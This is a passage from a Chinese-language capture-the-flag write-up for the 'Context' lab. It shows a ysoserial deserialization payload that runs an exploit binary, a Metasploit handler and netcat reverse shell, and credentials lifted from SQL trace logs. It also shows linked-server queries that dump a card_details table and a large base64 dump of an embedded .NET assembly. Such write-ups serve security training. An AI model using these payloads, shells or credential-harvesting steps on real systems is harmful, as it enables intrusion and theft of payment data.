(http://0.0.0.0:80/) ...\n10.13.37.12 - - [07/Mar/2024 16:34:53] "GET /shell.exe HTTP/1.1" 200 -\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u7136\u540e\u91cd\u65b0\u6784\u9020\u53cd\u5e8f\u5217\u5316\u8f7d\u8377"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'PS D:\\_Tools\\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\\Release> .\\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\\exploit.exe"\new0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXGV4cGxvaXQuZXhlJw0KICAgICAgICB9DQogICAgfQ0KfQ==\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u540c\u65f6\u542f\u52a8\u4e00\u4e2a\u76d1\u542c\u5668"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ sudo msfconsole -q\n[msf](Jobs:0 Agents:0) >> use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\n[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.16.2\nLHOST => 10.10.16.2\n[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 9999\nLPORT => 9999\n[msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit\n\n[*] Started reverse TCP handler on 10.10.16.2:9999\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u7f51\u9875\u4e0a\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u540e\uff0c\u6536\u5230\u56de\u8fde\u7684 shell"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ sudo netcat -lvnp 443\nListening on 0.0.0.0 443\nConnection received on 10.13.37.12\nWindows PowerShell running as user web_user on WEB\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32> whoami\nteignton\\web_user\n......\nPS C:\\Users\\Public> type flag.txt\nCONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="Flag',children:"CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"this-looks-bad",children:"This looks bad"}),"\n",(0,t.jsxs)(e.p,{children:["\u5728 ",(0,t.jsx)(e.code,{children:"C:\\"})," \u4e2d\uff0c\u53d1\u73b0\u65e5\u5fd7\u6587\u4ef6\u5939"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"PS C:\\Logs\\WEBDB> dir\n\n    Directory: C:\\Logs\\WEBDB\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       30/04/2020     15:42          16962 ERRORLOG\n-a----       30/04/2020     15:41          38740 ERRORLOG.1\n-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688578520000.xel\n-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688633370000.xel\n-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688733830000.xel\n-a----       27/04/2020     14:57          70144 HkEngineEventFile_0_132324694642170000.xel\n-a----       27/04/2020     15:09          70144 HkEngineEventFile_0_132324701496760000.xel\n-a----       28/04/2020     11:11          70144 HkEngineEventFile_0_132325422936270000.xel\n-a----       29/04/2020     15:23          70144 HkEngineEventFile_0_132326437911670000.xel\n-a----       29/04/2020     16:04          70144 HkEngineEventFile_0_132326462946300000.xel\n-a----       29/04/2020     16:08          70144 HkEngineEventFile_0_132326464955870000.xel\n-a----       30/04/2020     09:55          70144 HkEngineEventFile_0_132327105065260000.xel\n-a----       30/04/2020     10:15          70144 HkEngineEventFile_0_132327117227960000.xel\n-a----       30/04/2020     10:56          70144 HkEngineEventFile_0_132327142045910000.xel\n-a----       30/04/2020     12:33          70144 HkEngineEventFile_0_132327199844110000.xel\n-a----       30/04/2020     14:45          70144 HkEngineEventFile_0_132327279504690000.xel\n-a----       30/04/2020     15:41          70144 HkEngineEventFile_0_132327312839890000.xel\n-a----       30/04/2020     10:55        1048576 log_10.trc\n-a----       30/04/2020     11:34        1048576 log_11.trc\n-a----       30/04/2020     14:45        1048576 log_12.trc\n-a----       30/04/2020     15:41        1048576 log_13.trc\n-a----       30/04/2020     15:41           2560 log_14.trc\n-a----       30/04/2020     11:34         130048 system_health_0_132327142055920000.xel\n-a----       30/04/2020     14:45         160768 system_health_0_132327199872080000.xel\n-a----       30/04/2020     15:41         131072 system_health_0_132327279509840000.xel\n-a----       30/04/2020     15:41          98816 system_health_0_132327312844270000.xel\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5728\u5176\u4e2d\u53d1\u73b0\u53ef\u80fd\u7684\u51ed\u636e"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"PS C:\\Logs\\WEBDB> type log_13.trc | Select-String TEIGNTON\n\n????????? ??? ?????? ?????????? ??????? TEIGNTON\\karl.memaybe\n????????? ??? ?????? ?????????? ??????? B6rQx_d&RVqvcv2A\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u5c1d\u8bd5\u4f7f\u7528\u6b64\u51ed\u636e\u8fde\u63a5\u6570\u636e\u5e93"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $ impacket-mssqlclient teignton.htb/karl.memaybe:'B6rQx_d&RVqvcv2A'@10.13.37.12 -windows-auth\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(WEB\\WEBDB): Line 1: Changed database context to 'master'.\n[*] INFO(WEB\\WEBDB): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 822)\n[!] Press help for extra shell commands\nSQL>\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u6267\u884c\u73af\u5883\u63a2\u6d4b"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sql",children:"SQL> select @@version;\n\nMicrosoft SQL Server 2019 (RTM-GDR) (KB4517790) - 15.0.2070.41 (X64)\nOct 28 2019 19:56:59\nCopyright (C) 2019 Microsoft Corporation\nExpress Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)\n\nSQL> select user_name();\n\n\n--------------------------------------------------------------------------------------------------------------------------------\n\nguest\n\nSQL> SELECT name FROM master.dbo.sysdatabases;\nname\n\n--------------------------------------------------------------------------------------------------------------------------------\n\nmaster\ntempdb\nmodel\nmsdb\nwebapp\n\nSQL> select @@servername;\n\n--------------------------------------------------------------------------------------------------------------------------------\n\nWEB\\WEBDB\n\nSQL> select srvname from sysservers;\nsrvname\n\n--------------------------------------------------------------------------------------------------------------------------------\n\nWEB\\CLIENTS\nWEB\\WEBDB\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u4ece ",(0,t.jsx)(e.code,{children:"[web\\clients]"})," \u4e2d\u67e5\u8be2\u4fe1\u606f"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sql",children:"SQL> select * from openquery([web\\clients], 'select name from sysdatabases;');\nname\n\n--------------------------------------------------------------------------------------------------------------------------------\n\nmaster\ntempdb\nmodel\nmsdb\nclients\n\nSQL> select * from openquery([web\\clients], 'select name from clients.sys.objects;');\nname\n\n--------------------------------------------------------------------------------------------------------------------------------\n\nBackupClients\ncard_details\nQueryNotificationErrorsQueue\nqueue_messages_1977058079\nEventNotificationErrorsQueue\nqueue_messages_2009058193\nServiceBrokerQueue\nqueue_messages_2041058307\n"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"card_details"})," \u4e2d\u5305\u542b\u6709\u591a\u6761\u4fe1\u606f\uff0c\u5c1d\u8bd5\u8fdb\u884c\u7b5b\u9009"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u276f sqsh -S 10.13.37.12:1433 -U 'teignton\\karl.memaybe' -P 'B6rQx_d&RVqvcv2A'\nsqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray\nPortions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp\nThis is free software with ABSOLUTELY NO WARRANTY\nFor more information type '\\warranty'\n\n1> select * from openquery([web\\clients], 'select * from clients.dbo.card_details;');\n2> go | grep CONTEXT\nCONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-plaintext",metastring:'title="Flag"',children:"CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}\n"})}),"\n",(0,t.jsx)(e.h2,{id:"its-not-a-backdoor-its-a-feature",children:"It's not a backdoor, it's a feature"}),"\n",(0,t.jsxs)(e.p,{children:["\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u8fd8\u53d1\u73b0\u4e86 ",(0,t.jsx)(e.code,{children:"assembly_files"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sql",children:"SQL> select cast (N''as xml).value('xs:base64Binary(sql:column(\"content\"))','varchar(max)') as data from openquery([web\\clients],'select * from clients.sys.assembly_files;') order by content desc offset 1 rows;\ndata\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n\nb'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4QMSAw4ADwT5Aw4AMAQdBA4AQgT5Aw4ATQT5Aw4AaQQdBAAAAAABAAAAAAABAAEAAQAQABUAAAAFAAEAAQAJABAAJwAAAAUAAgAHAAEBAAAzAAAADQAKAAgAAQEAAEEAAAANABAACAABAQAATgAAAA0AFQAIAAEAEABiAAAABQAiAAgAAQCbAAoABgAFAS0ABgBBADEABgALATUABgAXATkABgAdAQoABgAnAQoABgAyAQoABgA6AQoABgZDATkAVoBLAS0AVoBVAS0AVoBjAS0AVoBuAS0AVoB1AS0ABgZDATkAVoB9ATEAVoCBATEAVoCGATEAVoCMATEABgZDATkAVoCVATUAVoCdATUAVoCkATUAVoCrATUAVoCxATUAVoC2ATUAVoC8ATUAVoDEATUAVoDJATUAVoDUATUAVoDeATUAVoDjATUAUCAAAAAAhhjFAA0AAQDUIAAAAADEAMsAFAADAAghAAAAAOYB1AAUAAMAGiEAAAAAxAHUABgAAwAAAAAAgACRINwAHQAEAAAAAACAAJEg7wAmAAgAKyEAAAAAhhjFABQACwA0IQAAAACWAPABeAALANwhAAAAAJYAGAJ8AAsA1CMAAAAAhhjFABQACwAAAAEAJQIAAAIAMQIAAAEAPQIAAAEARwIAAAIAUwIAAAMAXAIAAAQAZQIAAAEAawIAAAIAZQIAAAMAcAICAAkAMQDFAIEAOQDFABQACQDFABQAIQDbAoYAIQDoAoYAQQD7AoYASQALA4oAUQDFAJAACQDLABQAWQArA58AYQDFAKQAaQDFAKkAeQDFABQAIQDFAK8AgQDFAKQACQD7AoYAiQDsA6QAEQDUABQAKQDFABQAKQDyA8QAkQDFAKQAmQA9BBQAoQDFAMoAoQBbBNEAsQB2BNYAsQCCBNoAsQCMBNYACAAsADwACAAwAEEACAA0AEYACAA4AEsACAA8AFAACABEAFUACABIADwACABMAEEACABQAFoACABYAFUACABcADwACABgAEEACABkAEYACABoAEsACABsAFAACABwAF8ACAB0AGQACAB4AFoACAB8AGkACACAAG4ACACEAHMALgALAPkALgATAAIBAAFrADwAlgC2AN8AbgMAAQsA3AABAAABDQDvAAEABIAAAAAAAAAAAAAAAAAAAAAA1AIAAAQAAAAAAAAAAAAAAAEAcwAAAAAABAAAAAAAAAAAAAAAAQB8AAAAAAAEAAAAAAAAAAAAAAABAJcDAAAAAAAAADxNb2R1bGU+AHN0b3JlZC5kbGwATmV0d29ya0Nvbm5lY3Rpb24ATmV0UmVzb3VyY2UAUmVzb3VyY2VTY29wZQBSZXNvdXJjZVR5cGUAUmVzb3VyY2VEaXNwbGF5dHlwZQBTdG9yZWRQcm9jZWR1cmVzAG1zY29ybGliAFN5c3RlbQBPYmplY3QASURpc3Bvc2FibGUARW51bQBfbmV0d29ya05hbWUAU3lzdGVtLk5ldABOZXR3b3JrQ3JlZGVudGlhbAAuY3RvcgBGaW5hbGl6ZQBEaXNwb3NlAFdOZXRBZGRDb25uZWN0aW9uMgBXTmV0Q2FuY2VsQ29ubmVjdGlvbjIAU2NvcGUARGlzcGxheVR5cGUAVXNhZ2UATG9jYWxOYW1lAFJlbW90ZU5hbWUAQ29tbWVudABQcm92aWRlcgB2YWx1ZV9fAENvbm5lY3RlZABHbG9iYWxOZXR3b3JrAFJlbWVtYmVyZWQAUmVjZW50AENvbnRleHQAQW55AERpc2sAUHJpbnQAUmVzZXJ2ZWQAR2VuZXJpYwBEb21haW4AU2VydmVyAFNoYXJlAEZpbGUAR3JvdXAATmV0d29yawBSb290AFNoYXJlYWRtaW4ARGlyZWN0b3J5AFRyZWUATmRzY29udGFpbmVyAEJhY2t1cENsaWVudHMAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBHZW5lcmF0ZUhUTUwAbmV0d29ya05hbWUAY3JlZGVudGlhbHMAZGlzcG9zaW5nAG5ldFJlc291cmNlAHBhc3N3b3JkAHVzZXJuYW1lAGZsYWdzAG5hbWUAZm9yY2UAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAHN0b3JlZABnZXRfUGFzc3dvcmQAZ2V0X1VzZXJOYW1lAEludDMyAFRvU3RyaW5nAFN0cmluZwBDb25jYXQAU3lzdGVtLklPAElPRXhjZXB0aW9uAEdDAFN1cHByZXNzRmluYWxpemUAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAERsbEltcG9ydEF0dHJpYnV0ZQBtcHIuZGxsAFN0cnVjdExheW91dEF0dHJpYnV0ZQBMYXlvdXRLaW5kAFN5c3RlbS5EYXRhAE1pY3Jvc29mdC5TcWxTZXJ2ZXIuU2VydmVyAFNxbFByb2NlZHVyZUF0dHJpYnV0ZQBTdHJlYW1Xcml0ZXIAVGV4dFdyaXRlcgBXcml0ZQBBcHBlbmQAU3lzdGVtLkRhdGEuU3FsQ2xpZW50AFNxbENvbm5lY3Rpb24AU3lzdGVtLkRhdGEuQ29tbW9uAERiQ29ubmVjdGlvbgBPcGVuAFNxbENvbW1hbmQAU3FsRGF0YVJlYWRlcgBFeGVjdXRlUmVhZGVyAERiRGF0YVJlYWRlcgBnZXRfSGFzUm93cwBHZXRTdHJpbmcAUmVhZAAAAAAARUUAcgByAG8AcgAgAGMAbwBuAG4AZQBjAHQAaQBuAGcAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHMAaABhAHIAZQA6ACAAABFUAEUASQBHAE4AVABPAE4AABlqAGEAeQAuAHQAZQBpAGcAbgB0AG8AbgAAKUQAMABuAHQATAAwAHMAZQBTAGsAMwBsADMAdABvAG4ASwAzAHkAIQAAG1wAXABXAEUAQgBcAEMAbABpAGUAbgB0AHMAADVcAFwAVwBFAEIAXABDAGwAaQBlAG4AdABzAFwAYwBsAGkAZQBuAHQAcwAuAGgAdABtAGwAAIn3PAAhAEQATwBDAFQAWQBQAEUAIABIAFQATQBMACAAUABVAEIATABJAEMAIAAiAC0ALwAvAFcAMwBDAC8ALwBEAFQARAAgAEgAVABNAEwAIAA0AC4AMAAgAFQAcgBhAG4AcwBpAHQAaQBvAG4AYQBsAC8ALwBFAE4AIgA+AAoACgA8AGgAdABtAGwAPgAKADwAaABlAGEAZAA+AAoACQAKAAkAPABtAGUAdABhACAAaAB0AHQAcAAtAGUAcQB1AGkAdgA9ACIAYwBvAG4AdABlAG4AdAAtAHQAeQBwAGUAIgAgAGMAbwBuAHQAZQBuAHQAPQAiAHQAZQB4AHQALwBoAHQAbQBsADsAIABjAGgAYQByAHMAZQB0AD0AdQB0AGYALQA4ACIALwA+AAoACQA8AHQAaQB0AGwAZQA+ADwALwB0AGkAdABsAGUAPgAKAAkAPABtAGUAdABhACAAbgBhAG0AZQA9ACIAZwBlAG4AZQByAGEAdABvAHIAIgAgAGMAbwBuAHQAZQBuAHQAPQAiAEwAaQBiAHIAZQBPAGYAZgBpAGMAZQAgADYALgAwAC4ANwAuADMAIAAoAEwAaQBuAHUAeAApACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBjAHIAZQBhAHQAZQBkACIAIABjAG8AbgB0AGUAbgB0AD0AIgAwADAAOgAwADAAOgAwADAAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAGMAaABhAG4AZwBlAGQAYgB5ACIAIABjAG8AbgB0AGUAbgB0AD0AIgBDAG8AbgB0AGUAeAB0ACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBjAGgAYQBuAGcAZQBkACIAIABjAG8AbgB0AGUAbgB0AD0AIgAyADAAMgAwAC0AMAAxAC0AMQA2AFQAMQAyADoANQA3ADoANAA0ACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBBAHAAcABWAGUAcgBzAGkAbwBuACIAIABjAG8AbgB0AGUAbgB0AD0AIgAxADYALgAwADMAMAAwACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBEAG8AYwBTAGUAYwB1AHIAaQB0AHkAIgAgAGMAbwBuAHQAZQBuAHQAPQAiADAAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAEgAeQBwAGUAcgBsAGkAbgBrAHMAQwBoAGEAbgBnAGUAZAAiACAAYwBvAG4AdABlAG4AdAA9ACIAZgBhAGwAcwBlACIALwA+AAoACQA8AG0AZQB0AGEAIABuAGEAbQBlAD0AIgBMAGkAbgBrAHMAVQBwAFQAbwBEAGEAdABlACIAIABjAG8AbgB0AGUAbgB0AD0AIgBmAGEAbABzAGUAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAFMAYwBhAGwAZQBDAHIAbwBwACIAIABjAG8AbgB0AGUAbgB0AD0AIgBmAGEAbABzAGUAIgAvAD4ACgAJADwAbQBlAHQAYQAgAG4AYQBtAGUAPQAiAFMAaABhAHIAZQBEAG8AYwAiACAAYwBvAG4AdABlAG4AdAA9ACIAZgBhAGwAcwBlACIALwA+AAoACQAKAAkAPABzAHQAeQBsAGUAIAB0AHkAcABlAD0AIgB0AGUAeAB0AC8AYwBzAHMAIgA+AAoACQAJAGIAbwBkAHkALABkAGkAdgAsAHQAYQBiAGwAZQAsAHQAaABlAGEAZAAsAHQAYgBvAGQAeQAsAHQAZgBvAG8AdAAsAHQAcgAsAHQAaAAsAHQAZAAsAHAAIAB7ACAAZgBvAG4AdAAtAGYAYQBtAGkAbAB5ADoAIgBBAHIAaQBhAGwAIgA7ACAAZgBvAG4AdAAtAHMAaQB6AGUAOgB4AC0AcwBtAGEAbABsACAAfQAKAAkACQBhAC4AYwBvAG0AbQBlAG4AdAAtAGkAbgBkAGkAYwBhAHQAbwByADoAaABvAHYAZQByACAAKwAgAGMAbwBtAG0AZQBuAHQAIAB7ACAAYgBhAGMAawBnAHIAbwB1AG4AZAA6ACMAZgBmAGQAOwAgAHAAbwBzAGkAdABpAG8AbgA6AGEAYgBzAG8AbAB1AHQAZQA7ACAAZABpAHMAcABsAGEAeQA6AGIAbABvAGMAawA7ACAAYgBvAHIAZABlAHIAOgAxAHAAeAAgAHMAbwBsAGkAZAAgAGIAbABhAGMAawA7ACAAcABhAGQAZABpAG4AZwA6ADAALgA1AGUAbQA7ACAAIAB9ACAACgAJAAkAYQAuAGMAbwBtAG0AZQBuAHQALQBpAG4AZABpAGMAYQB0AG8AcgAgAHsAIABiAGEAYwBrAGcAcgBvAHUAbgBkADoAcgBlAGQAOwAgAGQAaQBzAHAAbABhAHkAOgBpAG4AbABpAG4AZQAtAGIAbABvAGMAawA7ACAAYgBvAHIAZABlAHIAOgAxAHAAeAAgAHMAbwBsAGkAZAAgAGIAbABhAGMAawA7ACAAdwBpAGQAdABoADoAMAAuADUAZQBtADsAIABoAGUAaQBnAGgAdAA6ADAALgA1AGUAbQA7ACAAIAB9ACAACgAJAAkAYwBvAG0AbQBlAG4AdAAgAHsAIABkAGkAcwBwAGwAYQB5ADoAbgBvAG4AZQA7ACAAIAB9ACAACgAJADwALwBzAHQAeQBsAGUAPgAKAAkACgA8AC8AaABlAGEAZAA+AAoACgA8AGIAbwBkAHkAPgAKADwAdABhAGIAbABlACAAYwBlAGwAbABzAHAAYQBjAGkAbgBnAD0AIgAwACIAIABiAG8AcgBkAGUAcgA9ACIAMAAiAD4ACgAJADwAYwBvAGwAZwByAG8AdQBwACAAdwBpAGQAdABoAD0AIgAxADgAMAAiAD4APAAvAGMAbwBsAGcAcgBvAHUAcAA+AAoACQA8AGMAbwBsAGcAcgBvAHUAcAAgAHcAaQBkAHQAaAA9ACIAMgAyADMAIgA+ADwALwBjAG8AbABnAHIAbwB1AHAAPgAKAAkAPABjAG8AbABnAHIAbwB1AHAAIAB3AGkAZAB0AGgAPQAiADIAMAA3ACIAPgA8AC8AYwBvAGwAZwByAG8AdQBwAD4ACgAJADwAYwBvAGwAZwByAG8AdQBwACAAdwBpAGQAdABoAD0AIgA2ADQAMgAiAD4APAAvAGMAbwBsAGcAcgBvAHUAcAA+AAoACQA8AGMAbwBsAGcAcgBvAHUAcAAgAHcAaQBkAHQAaAA9ACIAOQA2ACIAPgA8AC8AYwBvAGwAZwByAG8AdQBwAD4ACgAJADwAdAByAD4AATk8AC8AdABhAGIAbABlAD4ACgA8AC8AYgBvAGQAeQA+AAoACgA8AC8AaAB0AG0AbAA+AAoACQAJAAAJTgBhAG0AZQAAD0MAbwBtAHAAYQBuAHkAAAtFAG0AYQBpAGwAABdDAGEAcgBkACAATgB1AG0AYgBlAHIAABlTAGUAYwB1AHIAaQB0AHkAQwBvAGQAZQAACTwAdAByAD4AAF08AHQAZAAgAGgAZQBpAGcAaAB0AD0AIgAxADcAIgAgAGEAbABpAGcAbgA9ACIAbABlAGYAdAAiACAAdgBhAGwAaQBnAG4APQBiAG8AdAB0AG8AbQA+ADwAYgA+AAATPAAvAGIAPgA8AC8AdABkAD4AAAs8AC8AdAByAD4AAC9jAG8AbgB0AGUAeAB0ACAAYwBvAG4AbgBlAGMAdABpAG8AbgA9AHQAcgB1AGUAADVzAGUAbABlAGMAdAAgACoAIABmAHIAbwBtACAAYwBhAHIAZABfAGQAZQB0AGEAaQBsAHMAAFc8AHQAZAAgAGgAZQBpAGcAaAB0AD0AIgAxADcAIgAgAGEAbABpAGcAbgA9ACIAbABlAGYAdAAiACAAdgBhAGwAaQBnAG4APQBiAG8AdAB0AG8AbQA+AAALPAAvAHQAZAA+AABZrlvbO4TITrsIqJypk/eoAAi3elxWGTTgiQIGDgYgAgEOEhEDIAABBCABAQIIAAQIEgwODggGAAMIDggCAwYREAMGERQDBhEYAgYIBAEAAAAEAgAAAAQDAAAABAQAAAAEBQAAAAQAAAAABAgAAAAEBgAAAAQHAAAABAkAAAAECgAAAAQLAAAAAwAAAQQAABIVBCABAQgDIAAOBQACDg4OBSACAQ4ICAcEEgwIEgwCBAABARwEIAEBDgUgAQERO